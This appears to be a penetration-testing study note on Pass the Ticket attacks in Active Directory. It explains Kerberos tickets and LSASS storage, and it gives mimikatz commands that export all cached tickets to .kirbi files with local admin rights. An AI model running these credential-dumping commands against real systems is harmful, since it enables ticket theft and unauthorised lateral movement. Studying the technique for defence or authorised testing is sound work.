Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/).

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
# Harvesting Kerberos Tickets from Windows
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.

As user we can only get our _tickets_, but as local admin we can collect everything

We can use _sekurlsa::tickets /export_ module from #mimikatz.
```bash
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

dir *.kirbi # The result list of files with the extension `.kirbi`, which contain the tickets.
``` 


> [!NOTE] Different ticket
> _$_ -> correspond to the computer account
